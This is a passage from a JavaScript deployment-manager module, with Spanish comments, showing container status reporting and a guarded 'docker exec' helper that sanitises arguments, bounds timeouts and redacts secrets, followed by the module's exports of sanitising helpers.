      try { statsObj = JSON.parse((st.stdout || '').trim().split(/\r?\n/)[0]); } catch (e) {}
    }
    const cgroupMemory = readContainerCgroupV2Memory(containerId || '');
    return {
      ok: true,
      containerName: release.containerName,
      imageTag: release.imageTag,
      status,
      running: running === 'true',
      oomKilled: oomKilled === 'true',
      restartCount: parseInt(restartCount || '0', 10) || 0,
      startedAt,
      health,
      cpuPercent: statsObj?.CPUPerc || null,
      memUsage: statsObj?.MemUsage || null,
      memPercent: statsObj?.MemPerc || null,
      cgroupMemory,
      netIO: statsObj?.NetIO || null,
      blockIO: statsObj?.BlockIO || null,
      pids: statsObj?.PIDs || null
    };
  }

  /**
   * Ejecuta un comando de inspección puntual dentro del contenedor de producción (sin shell, redactado).
   * @param {string} projectId
   * @param {{ command?: string | string[], workdir?: string | null, timeoutMs?: number }} [opts]
   */
  async execInContainer(projectId, { command = '', workdir = null, timeoutMs = 30000 } = {}) {
    if (process.env.CULKIBO_ALLOW_EXEC === '0') {
      const err = new Error('La ejecución puntual en contenedores está deshabilitada (CULKIBO_ALLOW_EXEC=0)');
      /** @type {any} */ (err).status = 403;
      throw err;
    }
    const state = this.getState(projectId);
    const release = state.current;
    if (!release || !release.containerName) {
      const err = new Error('No hay contenedor de producción activo para este proyecto');
      /** @type {any} */ (err).status = 404;
      throw err;
    }
    const argv = parseSafeCommandArgv(command);
    const cleanWorkdir = sanitizeWorkdir(workdir);
    const safeTimeout = Math.min(120000, Math.max(1000, Number(timeoutMs) || 30000));
    const args = ['exec'];
    if (cleanWorkdir) args.push('-w', cleanWorkdir);
    args.push(release.containerName, ...argv);

    const started = Date.now();
    const res = await this.runDocker(args, { timeoutMs: safeTimeout });
    const secrets = this._secretValuesForProject(projectId);
    const cap = 64 * 1024;
    const stdout = this.redact((res.stdout || '').slice(0, cap), secrets);
    const stderr = this.redact((res.stderr || '').slice(0, cap), secrets);

    if (containerOrchestrator && typeof containerOrchestrator.addLog === 'function') {
      containerOrchestrator.addLog('INFO', `[Exec] ${release.containerName}: ${argv.join(' ')} (exit ${res.code})`, projectId);
    }

    return {
      ok: res.code === 0,
      exitCode: res.code,
      timedOut: Boolean(res.timedOut),
      durationMs: Date.now() - started,
      containerName: release.containerName,
      command: argv,
      stdout,
      stderr
    };
  }
}

// La instancia es el export principal; la clase y los ayudantes cuelgan de
// ella para que las pruebas puedan crear instancias aisladas sin disco.
const instance = /** @type {any} */ (new DeployManager());
instance.DeployManager = DeployManager;
instance.DEFAULTS = DEFAULTS;
instance.assertDiskHeadroom = assertDiskHeadroom;
instance.parseCgroupV2MemoryStats = parseCgroupV2MemoryStats;
instance.readContainerCgroupV2Memory = readContainerCgroupV2Memory;
instance.buildComposeResourceOverride = buildComposeResourceOverride;
instance.enforceComposeResourceLimits = enforceComposeResourceLimits;
instance.buildComposeUpArgs = buildComposeUpArgs;
instance.isPidAlive = isPidAlive;
instance.buildSafePruneArgs = buildSafePruneArgs;
instance.getProjectNetworkName = getProjectNetworkName;
instance.PROTECTED_CONTAINER_LABEL = PROTECTED_CONTAINER_LABEL;
instance.MAX_BUILDKIT_KEEP_STORAGE_GB = MAX_BUILDKIT_KEEP_STORAGE_GB;
instance.DEPLOY_LOCK_DEFAULT_TTL_MS = DEPLOY_LOCK_DEFAULT_TTL_MS;
instance.SIZE_ROTATION_LOG_DRIVERS = SIZE_ROTATION_LOG_DRIVERS;
instance.ALLOWED_LOG_DRIVERS = ALLOWED_LOG_DRIVERS;
instance.helpers = {
  safeSlug,
  isValidEnvName,
  sanitizeHealthPath,
  sanitizeSmokePath,
  sanitizeNodeMajor,
  sanitizePort,
  sanitizeBoundedInt,
  normalizeBuildSecretNames,
  sanitizeWorkspacePath,
  sanitizeWorkspacePackageName,
  filterSafeHostEnv,
  HOST_HIJACK_ENV_BLOCKLIST,
  evaluateFreezeStatus,
  isInFreezeWindow,
  normalizeSmokeConfig,
  normalizeCanaryConfig,
  assertDiskHeadroom,
  parseCgroupV2MemoryStats,
  readContainerCgroupV2Memory,
  extractComposeServiceNames,
  buildComposeResourceOverride,
  enforceComposeResourceLimits,
  buildComposeUpArgs,
  isPidAlive,
  buildSafePruneArgs,
  getProjectNetworkName,
  PROTECTED_CONTAINER_LABEL,
  MAX_BUILDKIT_KEEP_STORAGE_GB,
  DEPLOY_LOCK_DEFAULT_TTL_MS,
  SIZE_ROTATION_LOG_DRIVERS,
  ALLOWED_LOG_DRIVERS
};

module.exports = instance;
